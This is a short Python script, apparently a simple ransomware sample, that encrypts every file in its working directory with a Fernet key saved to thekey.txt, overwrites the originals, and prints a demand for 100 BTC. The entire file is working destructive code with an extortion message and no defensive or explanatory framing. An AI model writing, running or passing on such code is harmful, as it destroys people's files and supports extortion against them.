#find the files
import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
    if file == "encrypt.py" or file == "thekey.txt" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

key= Fernet.generate_key()
with open("thekey.txt", "wb") as key_file:
    key_file.write(key)

for file in files:
    with open(file, "rb") as thefile:
        data = thefile.read()

    fernet = Fernet(key)
    contents_encrypted = fernet.encrypt(data)

    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)


print("All of the files have been encrypted, send me 100 BTC to get the key by tomorrow")
